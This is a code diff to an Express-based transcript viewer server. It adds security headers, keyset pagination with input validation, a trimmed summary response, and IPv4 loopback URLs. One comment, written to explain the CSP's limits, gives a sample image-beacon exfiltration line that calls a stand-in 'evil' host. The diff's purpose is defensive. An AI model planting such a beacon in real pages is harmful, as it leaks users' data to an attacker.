@@ -153,8 +153,45 @@ class ChatsMobile {
    * Setup Express middleware
    */
   setupMiddleware() {
+    // Security headers (defense-in-depth). The viewer renders untrusted
+    // transcript content, and startServer() binds every interface (no host arg
+    // on app.listen) with an opt-in Cloudflare tunnel on top, so treat these
+    // as a real control, not decoration.
+    //
+    // Be honest about what this CSP does and doesn't buy:
+    //   - 'unsafe-inline' stays in script-src/style-src because the viewer is
+    //     built on inline handlers and an inline <script>. That means CSP does
+    //     NOT backstop an injected inline handler. The actual XSS defense is
+    //     output-escaping at the render sites (chats_mobile.html,
+    //     BlockRenderers.js). This header is a second layer, not the fix.
+    //   - connect-src 'self' blocks fetch/XHR/WebSocket exfiltration, but
+    //     img-src still allows https:, so a pixel beacon
+    //     (new Image().src = 'https://evil/?d=…') is NOT blocked. https: is kept
+    //     because transcripts can embed remote images (BlockRenderers renders
+    //     http(s) image blocks). Narrow it to 'self' data: if that's not needed.
+    //   - frame-ancestors 'none' + X-Frame-Options block clickjacking/framing,
+    //     and object-src 'none' / base-uri 'self' close plugin and <base> vectors.
+    this.app.use((req, res, next) => {
+      res.setHeader('Content-Security-Policy', [
+        "default-src 'self'",
+        "script-src 'self' 'unsafe-inline'",
+        "style-src 'self' 'unsafe-inline'",
+        "img-src 'self' data: https:",
+        "font-src 'self'",
+        "connect-src 'self'",
+        "object-src 'none'",
+        "base-uri 'self'",
+        "form-action 'self'",
+        "frame-ancestors 'none'"
+      ].join('; '));
+      res.setHeader('X-Content-Type-Options', 'nosniff');
+      res.setHeader('X-Frame-Options', 'DENY');
+      res.setHeader('Referrer-Policy', 'no-referrer');
+      next();
+    });
+
     this.app.use(express.json());
-    
+
     // Serve static files from analytics-web directory (for services, components, etc.)
     this.app.use('/services', express.static(path.join(__dirname, 'analytics-web', 'services')));
     this.app.use('/components', express.static(path.join(__dirname, 'analytics-web', 'components')));
@@ -172,9 +209,11 @@ class ChatsMobile {
 
         let conversations;
         if (this.useDatabaseBackend && this.databaseBackend.isInitialized) {
-          // Get conversations from database with subagent filter
+          // The cap has to exceed the corpus, not just the page. Paging filters
+          // this list in memory, so a fixed 10,000 made every conversation
+          // older than the newest 10,000 permanently unreachable by any cursor.
           conversations = this.databaseBackend.getConversations({
-            limit: 10000,
+            limit: Number.MAX_SAFE_INTEGER,
             includeSubagents
           });
 
@@ -192,11 +231,114 @@ class ChatsMobile {
           }
         }
 
+        // Keyset pagination, opt-in. The list view groups every conversation
+        // into project folders with counts, so it still asks for the whole set;
+        // forcing a page size would break that grouping. This exists for API
+        // consumers (MCP, scripts) that want a bounded window, and it keys on
+        // (lastModified, id) rather than OFFSET so paging stays stable while
+        // conversations are being re-indexed underneath it.
+        const before = typeof req.query.before === 'string' ? req.query.before : null;
+        const pageLimit = Number.parseInt(req.query.limit, 10);
+        const paging = before !== null || req.query.limit !== undefined;
+
+        // Validate before doing any work. `limit=garbage`, `limit=0` and
+        // negatives previously fell through as unpaged or no-op requests after
+        // the whole corpus had already been materialized.
+        if (req.query.limit !== undefined && (!Number.isFinite(pageLimit) || pageLimit < 1)) {
+          return res.status(400).json({
+            error: 'Invalid limit',
+            detail: 'limit must be a positive integer'
+          });
+        }
+
+        // Paging and subagent grouping are incompatible: grouping interleaves
+        // each parent with its children, and the (lastModified, id) ordering
+        // paging requires scatters them, so a page could contain a parent stub
+        // whose children sit on another page. Reject rather than return a
+        // silently broken shape.
+        if (paging && includeSubagents) {
+          return res.status(400).json({
+            error: 'Unsupported combination',
+            detail: 'limit/before cannot be combined with includeSubagents; grouping requires the full set.'
+          });
+        }
+
+        // `page` was never implemented here. It is accepted by a frontend
+        // helper, and silently ignoring it while honouring `limit` would return
+        // page 0 for every request.
+        if (req.query.page !== undefined) {
+          return res.status(400).json({
+            error: 'Unsupported parameter',
+            detail: 'Use keyset paging (limit + before) instead of page.'
+          });
+        }
+
+        if (paging) {
+          // The cursor compares (lastModified, id), so the list has to be
+          // ordered by exactly that. Neither source guarantees it: the SQL
+          // ORDER BY has no id tie-break, and the in-memory fallback sorts on
+          // lastModified alone. Without this, conversations sharing a timestamp
+          // could be skipped or repeated across pages.
+          conversations = [...conversations].sort((a, b) => {
+            const d = new Date(b.lastModified).getTime() - new Date(a.lastModified).getTime();
+            if (d !== 0) return d;
+            return String(b.id) < String(a.id) ? -1 : String(b.id) > String(a.id) ? 1 : 0;
+          });
+        }
+
+        if (before) {
+          // Split on the FIRST separator and require the prefix to be digits.
+          // lastIndexOf broke every id containing an underscore, and this repo
+          // builds subagent ids exactly that way (`<parentId>_agent-<id>`):
+          // "1700000000000_abc_agent-1" parsed a timestamp of
+          // "1700000000000_abc", which is NaN, so paging 400'd on those rows.
+          const sep = before.indexOf('_');
+          const tsPart = sep === -1 ? '' : before.slice(0, sep);
+          const beforeTs = /^\d+$/.test(tsPart) ? Number(tsPart) : NaN;
+          const beforeId = sep === -1 ? '' : before.slice(sep + 1);
+          // A malformed cursor must not silently return the whole list as if
+          // paging had been applied.
+          if (!Number.isFinite(beforeTs)) {
+            return res.status(400).json({ error: 'Invalid cursor', detail: 'Expected "<lastModifiedMs>_<id>"' });
+          }
+          conversations = conversations.filter(c => {
+            const ts = new Date(c.lastModified).getTime();
+            return ts < beforeTs || (ts === beforeTs && String(c.id) < beforeId);
+          });
+        }
+
+        let nextCursor = null;
+        if (Number.isFinite(pageLimit) && pageLimit > 0 && conversations.length > pageLimit) {
+          conversations = conversations.slice(0, pageLimit);
+          const last = conversations[conversations.length - 1];
+          nextCursor = `${new Date(last.lastModified).getTime()}_${last.id}`;
+        }
+
+        // Projection. `view=summary` returns only what a list row renders,
+        // which is roughly a quarter of the payload. filePath is the single
+        // largest field (~19%) and is never rendered; it is also an absolute
+        // host path, so there is no reason to hand it to the browser.
+        if (req.query.view === 'summary') {
+          conversations = conversations.map(c => ({
+            id: c.id,
+            project: c.project,
+            lastModified: c.lastModified,
+            messageCount: c.messageCount,
+            isSubagent: c.isSubagent,
+            parentId: c.parentId,
+            isStub: c.isStub,
+            subagentCount: c.subagentCount,
+            status: c.status,
+            conversationState: c.conversationState
+          }));
+        }
+
         res.json({
           conversations,
           timestamp: new Date().toISOString(),
           lastUpdate: this.data.lastUpdate,
-          includeSubagents
+          includeSubagents,
+          nextCursor
         });
       } catch (error) {
         console.error('Error serving conversations:', error);
@@ -1385,7 +1527,10 @@ class ChatsMobile {
         // Use database backend if available (much faster, lower memory)
         if (this.useDatabaseBackend && this.databaseBackend.isInitialized) {
           console.log(chalk.cyan('📦 Loading conversations from SQLite database...'));
-          conversations = this.databaseBackend.getConversations({ limit: 10000 });
+          conversations = this.databaseBackend.getConversations({ limit: Number.MAX_SAFE_INTEGER });
+          // No 10,000 cap here either: this list backs /api/search's browse
+          // and metadata-filter path, so capping it silently hid every
+          // conversation older than the newest 10,000 from those searches.
 
           // Initialize message counts from database (already indexed).
           // We mark every conversation as "ever seen" so the diff path
@@ -1471,7 +1616,12 @@ class ChatsMobile {
         if (address && typeof address === 'object') {
           this.port = address.port;
         }
-        this.localUrl = `http://localhost:${this.port}`;
+        // 127.0.0.1, not "localhost". Under Docker the published port is bound
+        // IPv4-only (docker-compose maps 127.0.0.1:9876), but "localhost"
+        // resolves to both 127.0.0.1 and ::1, so a client that prefers IPv6
+        // gets ECONNREFUSED on the very URL we print and auto-open, making a
+        // perfectly healthy server look broken on first run.
+        this.localUrl = `http://127.0.0.1:${this.port}`;
         console.log(chalk.green(`📱 Chats Mobile server started at ${this.localUrl}`));
         
         // Initialize WebSocket server with HTTP server
@@ -1599,7 +1749,7 @@ class ChatsMobile {
   async openBrowser() {
     try {
       // Use tunnel URL if available, otherwise local URL
-      const url = this.tunnelUrl || this.localUrl || `http://localhost:${this.port}`;
+      const url = this.tunnelUrl || this.localUrl || `http://127.0.0.1:${this.port}`;
       console.log(chalk.cyan(`🌐 Opening browser to ${url}`));
       await open(url);
     } catch (error) {
